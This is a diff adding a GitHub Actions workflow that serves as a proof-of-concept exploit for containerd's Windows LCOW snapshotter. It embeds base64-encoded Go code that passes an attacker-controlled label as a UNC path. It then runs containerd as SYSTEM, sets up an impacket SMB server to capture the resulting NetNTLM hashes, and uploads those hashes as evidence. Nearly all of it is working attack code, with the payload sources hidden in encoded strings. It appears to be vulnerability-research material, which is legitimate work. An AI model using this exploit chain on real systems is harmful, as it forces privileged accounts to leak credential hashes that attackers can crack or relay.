@@ -1,0 +1,86 @@
+name: D17 LCOW UNC NetNTLM capture
+on:
+  workflow_dispatch:
+
+jobs:
+  ntlm:
+    runs-on: windows-latest
+    timeout-minutes: 30
+    steps:
+      - name: Setup - download containerd, build harness + stub, install impacket
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $base = 'C:\ctdpoc'
+          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\canary","$base\go","$base\stub","$base\share" | Out-Null
+          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
+          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
+          $cfg='dmVyc2lvbiA9IDIKcm9vdCA9ICJDOi9jdGRwb2Mvcm9vdCIKc3RhdGUgPSAiQzovY3RkcG9jL3N0YXRlIgpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5zZXJ2ZXIudjEuZ3JwYyddCiAgYWRkcmVzcyA9ICdcXC5ccGlwZVxjdGQtZ3JwYycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuc2VydmVyLnYxLnR0cnBjJ10KICBhZGRyZXNzID0gJ1xcLlxwaXBlXGN0ZC10dHJwYycKW2RlYnVnXQogIGxldmVsID0gJ2RlYnVnJwo='; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
+          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
+          $mn='cGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImNvbnRleHQiCiAgICAiZm10IgogICAgIm9zIgoKICAgICJnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92Mi9jbGllbnQiCiAgICAiZ2l0aHViLmNvbS9jb250YWluZXJkL2NvbnRhaW5lcmQvdjIvY29yZS9zbmFwc2hvdHMiCikKCmZ1bmMgbWFpbigpIHsKICAgIC8vIGFyZ3M6IDxhZGRyZXNzPiA8bmFtZXNwYWNlPiA8c25hcHNob3R0ZXI+IDxrZXk+IDxsYWJlbC1rZXk+IDxsYWJlbC12YWx1ZT4KICAgIGlmIGxlbihvcy5BcmdzKSA8IDcgewogICAgICAgIGZtdC5QcmludGxuKCJuZWVkIDYgYXJncyIpCiAgICAgICAgb3MuRXhpdCgyKQogICAgfQogICAgYWRkciwgbnMsIHNuYXAsIGtleSwgbGssIGx2IDo9IG9zLkFyZ3NbMV0sIG9zLkFyZ3NbMl0sIG9zLkFyZ3NbM10sIG9zLkFyZ3NbNF0sIG9zLkFyZ3NbNV0sIG9zLkFyZ3NbNl0KICAgIGN0eCA6PSBjb250ZXh0LkJhY2tncm91bmQoKQogICAgYywgZXJyIDo9IGNsaWVudC5OZXcoYWRkciwgY2xpZW50LldpdGhEZWZhdWx0TmFtZXNwYWNlKG5zKSkKICAgIGlmIGVyciAhPSBuaWwgewogICAgICAgIGZtdC5QcmludGxuKCJjbGllbnQgZXJyOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBkZWZlciBjLkNsb3NlKCkKCiAgICAvLyBUaGlzIG1pcnJvcnMgQ1JJIFJ1blBvZFNhbmRib3g6IHVudHJ1c3RlZCBwb2QgYW5ub3RhdGlvbnMgYXJlIHBhc3NlZAogICAgLy8gdmVyYmF0aW0gYXMgc25hcHNob3QgbGFiZWxzIHRvIFNuYXBzaG90dGVyLlByZXBhcmUgdmlhIFdpdGhMYWJlbHMuCiAgICBtYWxpY2lvdXMgOj0gbWFwW3N0cmluZ11zdHJpbmd7bGs6IGx2fQogICAgc3MgOj0gYy5TbmFwc2hvdFNlcnZpY2Uoc25hcCkKICAgIG1vdW50cywgZXJyIDo9IHNzLlByZXBhcmUoY3R4LCBrZXksICIiLCBzbmFwc2hvdHMuV2l0aExhYmVscyhtYWxpY2lvdXMpKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LlByaW50bG4oIlBSRVBBUkVfRVJSOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmbXQuUHJpbnRsbigiUFJFUEFSRV9PSyBtb3VudHM6IiwgbW91bnRzKQp9Cg=='; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($mn))
+          $st='Ly9nbzpidWlsZCB3aW5kb3dzCgovLyBydW5oY3Nfc3R1Yi5nbyAtIExBQiBIQVJORVNTIGZvciB0aGUgSHlwZXItVi1kZXBlbmRlbnQgcnVuaGNzLmV4ZSBoZWxwZXIuCi8vIEltcGxlbWVudHMgdGhlIG5hcnJvdyBpbnRlcmZhY2UgY29udGFpbmVyZCdzIExDT1cgc25hcHNob3R0ZXIgdXNlczoKLy8gICBydW5oY3MuZXhlIDxnbG9iYWwgZmxhZ3M+IGNyZWF0ZS1zY3JhdGNoIC0tZGVzdHBhdGggPHBhdGg+Ci8vIEl0IGNyZWF0ZXMgYSBmaWxlIGF0IDxwYXRoPiAoYSBzdGFuZC1pbiBmb3IgdGhlIGV4dDQgVkhEWCB0aGF0IGdlbnVpbmUKLy8gcnVuaGNzIHByb2R1Y2VzIHZpYSBhIFVWTSkuIFRoaXMgaXMgTk9UIHRoZSB2dWxuZXJhYmlsaXR5IC0gdGhlIHZ1bG5lcmFibGUKLy8gY29kZSBpcyBjb250YWluZXJkJ3MgdXNlIG9mIGFuIGF0dGFja2VyLWNvbnRyb2xsZWQgbGFiZWwgYXMgYSBmaWxlc3lzdGVtCi8vIHBhdGgsIHdoaWNoIHJ1bnMgZm9yIHJlYWwgaW4gdGhpcyBQb0MuCnBhY2thZ2UgbWFpbgoKaW1wb3J0ICgKICAgICJmbXQiCiAgICAib3MiCikKCmZ1bmMgbWFpbigpIHsKICAgIGRlc3QgOj0gIiIKICAgIGZvciBpLCBhIDo9IHJhbmdlIG9zLkFyZ3MgewogICAgICAgIGlmIGEgPT0gIi0tZGVzdHBhdGgiICYmIGkrMSA8IGxlbihvcy5BcmdzKSB7CiAgICAgICAgICAgIGRlc3QgPSBvcy5BcmdzW2krMV0KICAgICAgICB9CiAgICB9CiAgICBpZiBkZXN0ID09ICIiIHsKICAgICAgICBmbXQuRnByaW50bG4ob3MuU3RkZXJyLCAicnVuaGNzIHN0dWI6IC0tZGVzdHBhdGggcmVxdWlyZWQiKQogICAgICAgIG9zLkV4aXQoMSkKICAgIH0KICAgIGYsIGVyciA6PSBvcy5PcGVuRmlsZShkZXN0LCBvcy5PX0NSRUFURXxvcy5PX1dST05MWXxvcy5PX1RSVU5DLCAwNjAwKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LkZwcmludGxuKG9zLlN0ZGVyciwgInJ1bmhjcyBzdHViOiBvcGVuOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICAvLyBtaW5pbWFsIFZIRFgtbGlrZSBwbGFjZWhvbGRlciBjb250ZW50ICg1MTIgYnl0ZXMpCiAgICBidWYgOj0gbWFrZShbXWJ5dGUsIDUxMikKICAgIGNvcHkoYnVmLCBbXWJ5dGUoImNvbnRhaW5lZCB2aXJ0YWwgZGlzayBwbGFjZWhvbGRlciAobGFiIGhhcm5lc3MpIikpCiAgICBpZiBfLCBlcnIgOj0gZi5Xcml0ZShidWYpOyBlcnIgIT0gbmlsIHsKICAgICAgICBmLkNsb3NlKCkKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmLkNsb3NlKCkKICAgIGZtdC5QcmludGxuKCJydW5oY3Mgc3R1YjogY3JlYXRlZCIsIGRlc3QpCn0K'; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
+          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
+          $env:GO111MODULE='on'
+          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\poc.exe" . 2>&1 | Out-Null
+          Write-Output "BUILD_POC_EXIT=$LASTEXITCODE"
+          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
+          Write-Output "BUILD_STUB_EXIT=$LASTEXITCODE"
+          python -m pip install --quiet impacket 2>&1 | Select-Object -Last 5
+          Write-Output "PIP_EXIT=$LASTEXITCODE"
+          python -c "import impacket; print('IMACKET', impacket.__version__)" 2>&1
+
+      - name: Start SMB server + containerd(SYSTEM) + trigger UNC label + capture
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $base='C:\ctdpoc'
+          # free port 445
+          Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 2
+          # get non-loopback IPv4
+          $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -First 1).IPAddress
+          Write-Output "RUNNER_IP=$ip"
+          $unc = "\\$ip\SHARE"
+          Write-Output "UNC_PATH=$unc"
+          # start impacket SMB server (logs hashes to file)
+          $smbpy = python -c "import impacket,os;print(os.path.join(os.path.dirname(impacket.__file__),'..','examples','smbserver.py'))" 2>$null
+          Write-Output "SMBPY=$smbpy"
+          $pSmb = Start-Process -FilePath "python" -ArgumentList @($smbpy,'-smb2support','-debug','-ip','0.0.0.0','-outputfile','C:\ctdpoc\smb.log','SHARE','C:\ctdpoc\share') -RedirectStandardOutput "$base\smb_stdout.log" -RedirectStandardError "$base\smb_stderr.log" -PassThru
+          Write-Output "SMB_PID=$($pSmb.Id)"
+          Start-Sleep -Seconds 5
+          # start containerd AS SYSTEM via scheduled task
+          $act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
+          $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+          $task = New-ScheduledTask -Action $act -Principal $prin
+          Register-ScheduledTask -TaskName 'ctdpoc-daemon' -InputObject $task -Force | Out-Null
+          Start-ScheduledTask -TaskName 'ctdpoc-daemon'
+          Write-Output 'SCHEDULED_TASK_STARTED'
+          Start-Sleep -Seconds 10
+          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
+          Write-Output '--- plugins ---'
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
+          Write-Output "=== malicious UNC label: $unc ==="
+          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-unc' 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location' $unc 2>&1 | Tee-Object -FilePath "$base\prepare_unc.out"
+          Write-Output "POC_EXIT=$LASTEXITCODE"
+          Start-Sleep -Seconds 5
+          Write-Output '=== SMB captured hashes ==='
+          if (Test-Path "$base\smb.log") { Get-Content "$base\smb.log" -Tail 60 } else { Write-Output 'smb.log missing' }
+          Write-Output '=== smb stderr ==='
+          if (Test-Path "$base\smb_stderr.log") { Get-Content "$base\smb_stderr.log" -Tail 30 }
+          Write-Output '=== daemon log tail ==='
+          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 30 }
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctd-ntlm-evidence
+          path: |
+            C:\ctdpoc\smb.log
+            C:\ctdpoc\smb_stderr.log
+            C:\ctdpoc\smb_stdout.log
+            C:\ctdpoc\prepare_unc.out
+            C:\ctdpoc\stderr.log
+            C:\ctdpoc\stdout.log
+            C:\ctdpoc\config.toml
+          if-no-files-found: warn
